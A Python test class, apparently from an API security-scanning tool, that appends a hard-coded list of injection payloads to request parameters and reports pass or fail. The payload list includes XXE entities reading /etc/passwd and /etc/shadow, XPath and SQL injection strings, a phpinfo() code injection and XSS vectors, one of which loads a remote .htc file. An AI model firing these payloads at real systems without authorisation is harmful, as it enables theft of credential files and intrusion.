import requests
from termcolor import colored

from src.base import BaseTest


xxei_raw = '''
count(/child::node())
x' or name()='username' or 'x'='y
<name>','')); phpinfo(); exit;/*</name>
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
'''

class SQLInjectionTest(BaseTest):
    xxei_n = 0
    xxei = xxei_raw.split('\n')

    def inject(self, s: str):
        return s + self.xxei[self.xxei_n]

    def _inject_forward(self):
        self.xxei_n += 1

    def run_tests(self):
        test_funcs = [func for func in dir(self) if func.startswith('test_') and callable(getattr(self, func))]

        if len(test_funcs) < 1:
            raise Exception("No test functions to run tests")

        for func in test_funcs:
            for _ in self.xxei:
                getattr(self, func)()
                if self.explanations.__len__() < 1:
                    print(colored('Passed at ' + __name__ + '.' + self.__class__.__name__ + '.' + func,
                                  'green', attrs=['bold']))
                else:
                    print(colored('Failed at ' + __name__ + '.' + self.__class__.__name__ + '.' + func,
                                  'red', attrs=['bold', 'underline']))

                    for i in self.explanations:
                        print('    ', colored(i, 'red'))

                self._inject_forward()

    def send_request(self, **kwargs):
        method = kwargs.get('method') or self.method
        url = kwargs.get('url') or self.url
        url += kwargs.get('path', '')
        headers = {**self.headers, **kwargs.get('headers', {})}
        json_body = kwargs.get('json_body') or self.json_body

        query_params_to_test = {k: self.inject(v) for k, v in kwargs.get('query_params_to_test', {}).items()}
        query_params = {**self.query_params, **kwargs.get('query_params', {}), **query_params_to_test}

        if method.upper() == 'GET':
            self.response = requests.get(url, params=query_params, headers=headers)
        if method.upper() == 'POST':
            self.response = requests.post(url, params=query_params, headers=headers, data=json_body)
        if method.upper() == 'PUT':
            self.response = requests.put(url, params=query_params, headers=headers, data=json_body)
        if method.upper() == 'DELETE':
            self.response = requests.delete(url, params=query_params, headers=headers, data=json_body)
        if method.upper() == 'OPTIONS':
            self.response = requests.options(url, params=query_params, headers=headers, data=json_body)


